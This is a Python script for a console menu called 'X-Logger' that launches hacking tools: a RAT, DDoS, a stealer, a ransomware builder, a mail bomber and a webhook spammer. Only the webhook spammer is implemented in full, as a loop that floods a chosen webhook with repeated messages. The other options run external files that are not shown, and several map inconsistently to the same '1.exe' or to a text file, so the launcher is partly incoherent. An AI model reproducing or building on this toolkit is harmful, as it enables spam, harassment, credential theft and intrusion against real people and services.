import os
import pystyle
import time
import colorama 
import ctypes

from pystyle import Colorate, Colors

import requests

def changer_titre(nouveau_titre):
    ctypes.windll.kernel32.SetConsoleTitleW(nouveau_titre)

def envoyer_message_via_webhook(webhook_url, message, nombre_messages):
    for _ in range(nombre_messages):
        data = {"content": message}
        response = requests.post(webhook_url, json=data)
        if response.status_code == 200:
            print(f"Message envoyé avec succès ({_ + 1}/{nombre_messages}).")
        else:
            print(f"Erreur lors de l'envoi du message. Code d'état : {response.status_code}")

changer_titre("X-Logger by wojack team and don adam, ochy")

font = ("""
                       ██╗  ██╗     ██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
                       ╚██╗██╔╝     ██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
                        ╚███╔╝█████╗██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
                        ██╔██╗╚════╝██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
                       ██╔╝ ██╗     ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
                       ╚═╝  ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
""")

options = ("""
Options:
                               ╔═══════════════════════════════════════════════╗
                               ║1) RAT                7)Ransomware builder     ║
                               ║2) Ddos               8)Port checker           ║
                               ║3) nitro gen                                   ║
                               ║4) webhook spammer                             ║   
                               ║5) mail bomber                                 ║
                               ║6) stealer                                     ║
                               ╚═══════════════════════════════════════════════╝
""")

print(Colorate.Vertical(Colors.blue_to_red, font + options))

# Lire l'entrée de l'utilisateur
choix_utilisateur = input("Choisissez une option : ")

# Traitement en fonction du choix de l'utilisateur
def lancer_logiciel_externe(nom_exe):
    print(f"Lancement du logiciel externe {nom_exe}...")
    os.system(nom_exe)  # Utilisez os.system pour lancer un exécutable

if choix_utilisateur == "1":
    lancer_logiciel_externe("1.exe")
elif choix_utilisateur == "2":
    lancer_logiciel_externe("1.exe")
elif choix_utilisateur == "3":
    lancer_logiciel_externe("LoggerNitro.py")
elif choix_utilisateur == "4":
    webhook_url = input("Entrez votre webhook : ")
    message = input("Entrez le message à envoyer : ")
    nombre_messages = int(input("Entrez le nombre de messages à envoyer : "))
    envoyer_message_via_webhook(webhook_url, message, nombre_messages)
elif choix_utilisateur == "5":
    lancer_logiciel_externe("mailbomber.py")
elif choix_utilisateur == "6":
    lancer_logiciel_externe("ConfigStealer.txt")
elif choix_utilisateur == "7":
    lancer_logiciel_externe("1.exe")
elif choix_utilisateur == "8":
    lancer_logiciel_externe("1.exe")
else:
   exit()
